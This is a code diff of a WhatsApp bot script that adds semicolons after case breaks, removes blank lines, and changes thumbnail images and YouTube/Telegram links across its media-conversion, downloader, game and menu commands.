@@ -16710,9 +16288,8 @@ list.push({
 					replygcxenon(util.format(e))
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'toaud': case 'toaudio': {
 				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxenon(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
 				XenonStickWait()
@@ -16720,19 +16297,17 @@ list.push({
 				let audio = await toAudio(media, 'mp4')
 				await XenonBotInc.sendMessage(m.chat, { audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'tomp3': {
 				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxenon(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
 				XenonStickWait()
 				let media = await (m.quoted ? m.quoted.download() : m.download())
 				let audio = await toAudio(media, 'mp4')
-				await XenonBotInc.sendMessage(m.chat, { document: audio, mimetype: 'audio/mpeg', fileName: `Dr_Xenon1.mp3`}, { quoted : m })
+				await XenonBotInc.sendMessage(m.chat, { document: audio, mimetype: 'audio/mpeg', fileName: `DrXenon.mp3`}, { quoted : m })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'tovn': case 'toptt': case 'tovoice': {
 				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxenon(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
 				XenonStickWait()
@@ -16740,9 +16315,8 @@ list.push({
 				let audio = await toPTT(media, 'mp4')
 				await XenonBotInc.sendMessage(m.chat, { audio: audio, mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: m })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'togif': {
 				if (!/webp/.test(mime) && !/video/.test(mime)) return replygcxenon(`Reply Video/Sticker with caption *${prefix + command}*`)
 				XenonStickWait()
@@ -16752,9 +16326,8 @@ list.push({
 				await XenonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
 				await fs.unlinkSync(media)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'tovideo': case 'tomp4': {
 				if (!/webp/.test(mime) && !/video/.test(mime)) return replygcxenon(`Reply Video/Sticker with caption *${prefix + command}*`)
 				XenonStickWait()
@@ -16764,9 +16337,8 @@ list.push({
 				await XenonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result }, caption: 'Convert Webp To Video' }, { quoted: m })
 				await fs.unlinkSync(media)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'toimage': case 'toimg': {
 				if (!/webp/.test(mime)) return replygcxenon(`Reply Video/Sticker with caption *${prefix + command}*`)
 				XenonStickWait()
@@ -16780,9 +16352,8 @@ list.push({
 					fs.unlinkSync(ran)
 				})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'toptv': {
 				if (!/video/.test(mime)) return replygcxenon(`Send/Reply the video you want to use as a PTV message with caption ${prefix + command}`)
 				if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
@@ -16793,9 +16364,8 @@ list.push({
 					replygcxenon('Reply Videos You Want to Convert to PTV Messages!')
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'tourl': {
 				let { fileIO, TelegraPh } = require('./lib/uploader')
 				if (/jpg|jpeg|png/.test(mime)) {
@@ -16812,18 +16382,16 @@ list.push({
 					replygcxenon('Send the media you want to upload!')
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'texttospeech-indo': case 'tts-indo': case 'ttsindo': {
 				if (!text) return replygcxenon('Where is the text you want to convert to audio??')
 				let { tts } = require('./lib/tts')
 				let anu = await tts(text)
 				XenonBotInc.sendMessage(m.chat, { audio: anu, ptt: true, mimetype: 'audio/mpeg' }, { quoted: m })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'say': case 'tts': case 'gtts':{
 if (!text) return replygcxenon('Where is the text?')
             let texttts = text
@@ -16843,17 +16411,15 @@ if (!text) return replygcxenon('Where is the text?')
                 quoted: m,
             })
         }
-        break
+        break;
 //===========================================================================================================================//
-
 			case 'toqr': case 'qr': {
 				if (!text) return replygcxenon(`Please include a text or link\n\nFor Example:\n*${prefix + command}* wassup`)
 				XenonStickWait()
 				await XenonBotInc.sendMessage(m.chat, { image: { url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + text }, caption: 'Here you go!' }, { quoted: m })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'ssweb': {
 				if (!text) return replygcxenon(`Example: ${prefix + command} https://github.com/Dr_Xenon1`)
 				if (!text.startsWith('http')) {
@@ -16864,9 +16430,8 @@ if (!text) return replygcxenon('Where is the text?')
 					await XenonBotInc.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case'smeta': {
 if (!/webp/.test(mime)) return replygcxenon('Reply sticker!')
   var stiker = false
@@ -16890,9 +16455,8 @@ if (!/webp/.test(mime)) return replygcxenon('Reply sticker!')
                                                                             else return replygcxenon('reply sticker')
                                                                               }
                                                                               }       
-                                                                              break
+                                                                              break;
 //===========================================================================================================================//
-
 			case 's': case 'sticker': case 'stiker': {
 if (!quoted) return replygcxenon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
 if (/image/.test(mime)) {
@@ -16906,9 +16470,8 @@ let encmedia = await XenonBotInc.sendVideoAsSticker(m.chat, media, m, { packname
 replygcxenon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'swm': case 'steal': case 'stickerwm': case 'take':{
 if (!isPremium) return replyprem(mess.premium)
 if (!args.join(" ")) return replygcxenon(`Where is the text?`)
@@ -16929,9 +16492,8 @@ let encmedia = await XenonBotInc.sendVideoAsSticker(m.chat, media, m, { packname
 replygcxenon(`Photo/Video?`)
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'smeme': case 'stickermeme': case 'stickmeme': {
 if (!/webp/.test(mime) && /image/.test(mime)) {
 if (!text) return replygcxenon(`Usage: ${prefix + command} text1|text2`)
@@ -16946,15 +16508,13 @@ memek = await XenonBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global
 replygcxenon(`Send/reply image with caption ${prefix + command} text1|text2`)
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'write': {
 				replygcxenon(`*Example*\n${prefix}writeleft text\n${prefix}writeright text\n${prefix}folioleft text\n${prefix}folioright text`)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'writeleft': {
 				if (!text) return replygcxenon(`Send command *${prefix + command}* text`)
 				XenonStickWait()
@@ -16980,9 +16540,8 @@ break
 					XenonBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
 				})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'writeright': {
 				if (!text) return replygcxenon(`Send command *${prefix + command}* text`)
 				XenonStickWait()
@@ -17008,9 +16567,8 @@ break
 					XenonBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
 				})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'folioleft': {
 				if (!text) return replygcxenon(`Send command *${prefix + command}* text`)
 				XenonStickWait()
@@ -17036,9 +16594,8 @@ break
 					XenonBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
 				})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'folioright': {
 				if (!text) return replygcxenon(`Send command *${prefix + command}* text`)
 				XenonStickWait()
@@ -17064,9 +16621,8 @@ break
 					XenonBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
 				})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			
 			// Ai Menu
 			case 'ai2': case 'gpt2': case 'openai2': {
@@ -17074,9 +16630,8 @@ break
 				const hasil = await chatGpt(text);
 				replygcxenon(hasil)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			// Search Menu
 			case 'play':  case 'song': {
 if (!text) return replygcxenon(`Example : ${prefix + command} anime whatsapp status`)
@@ -17107,9 +16662,8 @@ await fs.unlinkSync(pl.path)
 	replygcxenon(`Music not found.`)
 	}
 }
-break
+break;
 //===========================================================================================================================//
-
 			
 			case 'pixiv': {
 				if (!text) return replygcxenon(`Example: ${prefix + command} hello`)
@@ -17126,9 +16680,8 @@ break
 					replygcxenon('Search Not found!')
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'pinterest': case 'pin': {
   if (!text) return replygcxenon(`Title?`);
   async function createImage(url) {
@@ -17209,9 +16762,8 @@ break
     messageId: bot.key.id
   });
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'wallpaper': {
                 if (!text) return replygcxenon('Enter Query Title')
                 await XenonStickWait()
@@ -17258,18 +16810,16 @@ break
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})                
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'ringtone': {
 				if (!text) return replygcxenon(`Example: ${prefix + command} black rover`)
 				let anu = await ringtone(text)
 				let result = pickRandom(anu)
 				await XenonBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title + '.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			
 			// Downloader Menu
 case 'ytmp3': case 'ytaudio': case 'ytplayaudio': {
@@ -17293,9 +16843,8 @@ case 'ytmp3': case 'ytaudio': case 'ytplayaudio': {
 					}
 				}, { quoted: m });
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'ytmp4': case 'ytvideo': case 'ytplayvideo': {
 				if (!text) return replygcxenon(`Example: ${prefix + command} url_youtube`)
 				if (!text.includes('youtu')) return replygcxenon('The link is not a youtube link!')
@@ -17303,9 +16852,8 @@ case 'ytmp3': case 'ytaudio': case 'ytplayaudio': {
 				XenonStickWait()
 				await XenonBotInc.sendMessage(m.chat, { video: { url: hasil.result }, caption: `*📍Title:* ${hasil.title}\n*✏Description:* ${hasil.desc ? hasil.desc : ''}\n*🚀Channel:* ${hasil.channel}\n*🗓Upload at:* ${hasil.uploadDate}` }, { quoted: m });
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'apk': {
 	try {
     if (command === 'apk') {
@@ -17327,9 +16875,8 @@ case 'ytmp3': case 'ytaudio': case 'ytplayaudio': {
     return replygcxenon(`*[❗] An error occurred. Make sure to provide a valid link.*`);
   }
 };
-break
+break;
 //===========================================================================================================================//
-
 case 'mega':{
 	try {
 if (!text) return replygcxenon(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
@@ -17358,9 +16905,8 @@ const { File } = require('megajs');
         return replygcxenon(`Error: ${error.message}`);
     }
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'twitter': case 'twitterdl': case 'twitterdl': {
 	if (!args[0]) return replygcxenon(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
 	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return replygcxenon('Link Invalid!')
@@ -17413,9 +16959,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
   	replygcxenon(`Verify that the link is from Twitter`)
 	}
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'fb':
            case 'facebook':
 case 'facebookvid': {
@@ -17439,9 +16984,8 @@ ${themeemoji} Title: ${result.title}`;
     replygcxenon('Maybe private video!')
   }
   }
-  break
+  break;
 //===========================================================================================================================//
-
 			case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
 	  if (!text) return replygcxenon(`You need to give the URL of Any Instagram video, post, reel, image`)
   let res
@@ -17542,9 +17086,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     }
   }
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'tiktok': case 'tiktokdown': case 'ttdown': case 'ttdl': case 'tt': case 'ttmp4': case 'ttvideo': case 'tiktokmp4': case 'tiktokvideo': {
 				if (!text) return replygcxenon(`Example: ${prefix + command} url_tiktok`)
 				if (!text.includes('tiktok.com')) return replygcxenon('Url Tidak Mengandung Result Dari Tiktok!')
@@ -17558,9 +17101,8 @@ break
 					}
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'ttmp3': case 'tiktokmp3': case 'ttaudio': case 'tiktokaudio': {
 				if (!text) return replygcxenon(`Example: ${prefix + command} url_tiktok`)
 				if (!text.includes('tiktok.com')) return replygcxenon('Url Tidak Mengandung Result Dari Tiktok!')
@@ -17582,9 +17124,8 @@ break
 					}
 				}, { quoted: m });
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			
 			// Fun Menu
 			case 'dice': {
@@ -17592,29 +17133,25 @@ break
 				let media = pickRandom(ddsa)
 				await XenonBotInc.sendImageAsSticker(m.chat, media.url, m, { packname: global.packname, author: global.author, isAvatar: 1 })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			
 			// Game Menu
 			case 'slot': {
 				await gameSlot(XenonBotInc, m, global.db.users)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'casino': {
 				await gameCasinoSolo(XenonBotInc, m, prefix, global.db.users)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'robber': case 'rob': {
 				await gameMerampok(m, global.db.users)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'suitpvp': case 'suit': {
 				let poin = 10
 				let poin_lose = 10
@@ -17637,9 +17174,8 @@ break
 					}, 60000), poin, poin_lose, timeout
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'ttc': case 'ttt': case 'tictactoe': {
 				let TicTacToe = require('./lib/tictactoe');
 				if (Object.values(game.tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcxenon(`You are still in the game!\nType *${prefix}del${command}* If you want to end the session`);
@@ -17672,9 +17208,8 @@ break
 					game.tictactoe[room.id] = room
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'playbomb': case 'bomb': {
 				if (game.tebakbom[m.sender]) return replygcxenon('There Are Still Unfinished Sessions!')
 				function shuffle(array) {
@@ -17694,9 +17229,8 @@ break
 				}
 				replygcxenon(`*GUESS THE BOMB*\n\n${game.tebakbom[m.sender].board.join("")}\n\nChoose that number! and don't get hit by a bomb!\nBomb : ${game.tebakbom[m.sender].bomb}\nLife : ${game.tebakbom[m.sender].nyawa.join("")}`);
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'mathquiz': case 'math': {
 				const { genMath, modes } = require('./lib/math');
 				const inputMode = ['noob', 'easy', 'medium', 'hard','extreme','impossible','impossible2'];
@@ -17716,9 +17250,8 @@ break
 					delete game.kuismath[m.sender.split('@')[0]]
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			
 			// Menu
 		    case 'menu': case 'help': case 'alive': {
@@ -17878,7 +17411,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -17903,7 +17436,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -17936,11 +17469,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -17998,11 +17531,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -18162,11 +17695,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -18206,9 +17739,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'allmenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -18950,7 +18482,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -18976,7 +18508,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -19009,11 +18541,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -19071,11 +18603,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -19156,11 +18688,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -19200,9 +18732,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'ownermenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -19392,7 +18923,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -19418,7 +18949,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -19451,11 +18982,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -19513,11 +19044,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -19598,11 +19129,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -19642,9 +19173,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'groupmenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -19813,7 +19343,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -19839,7 +19369,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -19872,11 +19402,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -19934,11 +19464,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -20019,11 +19549,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -20063,9 +19593,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'searchmenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -20189,7 +19718,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -20215,7 +19744,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
